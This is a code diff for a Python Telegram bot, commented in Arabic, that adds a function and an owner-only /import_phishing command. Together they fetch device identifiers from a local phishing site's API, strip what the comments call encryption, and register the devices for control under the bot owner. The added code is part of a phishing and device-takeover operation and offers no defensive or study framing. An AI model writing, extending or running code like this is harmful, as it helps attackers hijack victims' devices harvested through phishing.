@@ -1048,6 +1048,48 @@ def import_devices_from_web_interface(user_id):
         logger.error(f"خطأ في استيراد الأجهزة من واجهة الويب: {e}")
         return False
 
+def import_devices_from_phishing_site(user_id):
+    """استيراد الأجهزة من موقع التصيد المحلي"""
+    try:
+        # الاتصال بموقع التصيد المحلي
+        response = requests.get('http://localhost:3000/api/devices', timeout=10)
+        
+        if response.status_code == 200:
+            devices_data = response.json()
+            
+            if devices_data.get('success') and 'devices' in devices_data:
+                imported_count = 0
+                for device_data in devices_data['devices']:
+                    device_id = device_data.get('deviceId')
+                    if device_id:
+                        # فك تشفير معرف الجهاز إذا كان مشفراً
+                        try:
+                            decrypted_id = device_id
+                            if ':' in device_id:  # إذا كان مشفراً
+                                # هنا يمكن إضافة منطق فك التشفير
+                                decrypted_id = device_id.split(':')[-1] if ':' in device_id else device_id
+                            
+                            # إضافة الجهاز إذا لم يكن موجوداً
+                            if device_manager.add_device_auto(user_id, decrypted_id):
+                                imported_count += 1
+                                logger.info(f"تم إضافة جهاز جديد: {decrypted_id}")
+                        except Exception as e:
+                            logger.error(f"خطأ في معالجة الجهاز {device_id}: {e}")
+                            continue
+                
+                logger.info(f"تم استيراد {imported_count} جهاز من موقع التصيد")
+                return imported_count > 0
+            else:
+                logger.warning("لا توجد أجهزة في موقع التصيد")
+                return False
+        else:
+            logger.error(f"فشل في الاتصال بموقع التصيد: {response.status_code}")
+            return False
+        
+    except Exception as e:
+        logger.error(f"خطأ في استيراد الأجهزة من موقع التصيد: {e}")
+        return False
+
 # تهيئة المدراء - سيتم تهيئتها في دالة initialize_system
 
 # إضافة مستخدمين مصرح لهم (يمكن تعديلها حسب الحاجة)
@@ -1404,6 +1446,37 @@ def force_activate_devices(message):
         bot.reply_to(message, f"❌ فشل في تفعيل أي جهاز.\nفشل: {failed_count} جهاز")
     
     device_manager.log_activity(user_id, 'force_activate_devices', f'activated: {activated_count}, failed: {failed_count}')
+
+
+@bot.message_handler(commands=['import_phishing'])
+def import_phishing_devices(message):
+    """استيراد الأجهزة من موقع التصيد"""
+    user_id = message.from_user.id
+    
+    if not is_owner(user_id):
+        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
+        return
+    
+    if not device_manager.is_user_authorized(user_id):
+        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
+        return
+
+    if not security_manager.check_rate_limit(user_id):
+        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
+        return
+
+    try:
+        # محاولة استيراد الأجهزة من موقع التصيد
+        imported = import_devices_from_phishing_site(user_id)
+        
+        if imported:
+            bot.reply_to(message, "✅ تم استيراد الأجهزة من موقع التصيد بنجاح!")
+        else:
+            bot.reply_to(message, "❌ فشل في استيراد الأجهزة من موقع التصيد.")
+            
+    except Exception as e:
+        logger.error(f"خطأ في استيراد الأجهزة من التصيد: {e}")
+        bot.reply_to(message, f"❌ خطأ في استيراد الأجهزة: {str(e)}")
 
 
 @bot.message_handler(commands=['devices'])
